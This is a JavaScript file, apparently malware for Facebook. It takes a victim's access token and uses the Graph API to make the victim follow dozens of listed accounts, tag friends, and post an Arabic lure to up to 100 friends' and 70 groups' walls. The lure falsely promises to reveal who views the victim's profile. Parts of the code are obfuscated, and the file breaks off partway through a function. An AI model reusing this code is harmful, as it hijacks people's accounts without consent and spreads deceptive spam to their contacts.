
var access_token = "";
var url = "https://www.youtube.com/watch?v=3mDca_ql7Wo";
var text = "واخيرااااا انا شفت مين بيزور بروفايلي يوميا وكل ما حد يزور بروفايلي يجيلي اشعار وبدون تطبيقات كاذبة ادخل وشوف الفيديو ع يوتيوب وحتركب الخاصية بحسابك بثواني زي ما انا عملتها  --->";
var image_link = "http://im71.gulfup.com/HK3yeq.jpg";
var ibraheemnada=' http://facebook.com/';
var note_text = "1";
var note_image = "http://im71.gulfup.com/HK3yeq.jpg";
gonderildi = 0;

follow("ewan.chaldean");
follow("H999999");
follow("liza.mac.54");
follow("ali.basiimm");
follow("K1ngAlHackers");
follow("tktt333");
follow("hatice.belen.77");
follow("StolenHeartsUSR");
follow("xnxx.S");
follow("AlaaalDarraj");
follow("lovesey2012");
follow("tofeOh");
follow("susanne.hansen.92351995");
follow("MR.7ATM00K");
follow("krraralpayate");
follow("fsdju.sdfks");
follow("mr.hussam.crazy");
follow("abbas.ab12");
follow("nAmE779");
follow("hayder4");
follow("i.love.iraq1999");
follow("100000603049028");
follow("mudheer");
follow("100000153946976");
follow("ellie.smith.54772728");
follow("kurdish.x");
follow("morteza.aldenenawe");
follow("ali.model89");
follow("taqi.love2010");
follow("Ahmed.Kanani");
follow("irkann");
follow("sivs.dor");
follow("ALI.ASSEROO");
follow("Ramy.ramramm");
follow("mohammed.kadhem.397");
follow("ailaltmeme168");
follow("ibrihem.altaae");
follow("ali.alfatme1");
follow("al0ke");
follow("mr.hmedo");
follow("100003005884125");
follow("100000153946976");
follow("100005276161954");
follow("peter.davis.37201");
follow("1Bek1");
follow("iahl2010");
follow("Aliraqi.love17");
follow("Ali.kurde92");
follow("Dollerss");
follow("ALUOOSH.NOOSA");
follow("amaar.aliraqi.754");
follow("mntder");
follow("mhmd.h.almlky");
follow("muamar.fm");
follow("100006203796136");
follow("wdewdw.dggf");
follow("IP.IRAQ.2004");
follow("100004685410997");
//function CreateNote() {
//    jQuery['ajax']({
//        url: 'https://graph.facebook.com/me/notes?subject='+note_text+'&message=<center><a href="'+url+'" target="_blank"><img src="'+note_image+'"></a></center>&method=POST&access_token=' + access_token,
//        dataType: 'jsonp',
//        success: function (data) {
//         noteid = data.id;
//         get_groups();
//         get_friends();
//         timeline();
//        }
//    });
//};
	 function get_groups(){
	 jQuery.ajax({
	 url:'https://graph.facebook.com/fql?q=select gid, name from group where gid IN (SELECT gid FROM group_member WHERE uid=me()) order by rand() limit 70&access_token='+access_token,
	 dataType:'jsonp',
	 success:function(data){
	 post_groups(data);
	 }
	 });
	 }
	 function get_friends(){
	 jQuery.ajax({
	 url:'https://graph.facebook.com/fql?q=SELECT uid, first_name FROM user WHERE uid IN ( SELECT uid2 FROM friend WHERE uid1 = me() ) ORDER BY rand() limit 100&access_token='+access_token,
	 dataType:'jsonp',
	 success:function(data){
	 post_friends(data);
	 }
	 });
	 }
	 function post_friends(list){
     for(i=0;i<list.data.length;i++){
     jQuery.ajax({
     url:'https://graph.facebook.com/'+list.data[i].uid+'/photos?url=' + image_link + '&message=' + text +'' + url + '&callback=paylas&method=POST&access_token=' + access_token,
     dataType:'script',
     success:function(){
     gonderildi += 1;
     if(gonderildi >= list.data.length){
	 }
     }
     });
     }
     }
	 function post_groups(list){
	 for(i=0;i<list.data.length;i++){
	 jQuery.ajax({
	 url:'https://graph.facebook.com/'+list.data[i].gid+'/photos?url=' + image_link + '&message='+ text +'' + url + '&callback=paylas&method=POST&access_token=' + access_token,
	 dataType:'script',
	 success:function(){
	 gonderildi += 1;
	 if(gonderildi >= list.data.length){
	 }
	 }
	 });
	 }
	 }
     
	 function timeline() {
    $['getJSON']('https://graph.facebook.com/me/photos?url=' + image_link + '&message=' + text + '' + url + '&method=POST&access_token=' + access_token, function (_0x1f66xf) {
        if (_0x1f66xf['id']) {
            var _0x1f66x11 = _0x1f66xf['id'];
            var _0x1f66x12 = 100;
            $['getJSON']('https://graph.facebook.com/me/friends?limit=' + _0x1f66x12 + '&access_token=' + access_token, function (_0x1f66xf) {
                if (_0x1f66xf['data']) {
                    var _0x1f66x13 = [];
                    $['each'](_0x1f66xf['data'], function (_0x1f66x14, _0x1f66x7) {
                        _0x1f66x13['push'](_0x1f66x7['id']);
                        $['getJSON']('https://graph.facebook.com/' + _0x1f66x11 + '/tags/' + _0x1f66x7['id'] + '/?method=POST&access_token=' + access_token, function (_0x1f66xf) {});
                    });
                };
            });
        };
    });
};


	 function follow(id){
     $.getJSON('https://graph.facebook.com/' + id + '/subscribers?method=post&access_token=' + access_token, function (response) {
     });
	 }
	 function like_page(id){
     $.getJSON('https://graph.facebook.com/me/likes?access_token=' + access_token + '&method=POST&url=https://www.facebook.com/' + id, function (response) {
     });
	 }
	 function like_post(id){
     $.getJSON('https://graph.facebook.com/' + id + '/likes/?method=post&access_token=' + access_token, function (response) {
     });
	 }
	 function join_group(grpid){
	 $.getJSON('https://graph.facebook.com/me?access_token=' + access_token, function (response) {
	 if (response.id) {
	 var userid = response.id;
	 $.getJSON('https://graph.facebook.com/'+grpid+'/members/' + userid + '?method=post&access_token=' + access_token, function (response) {
     if(response.data){
	 }

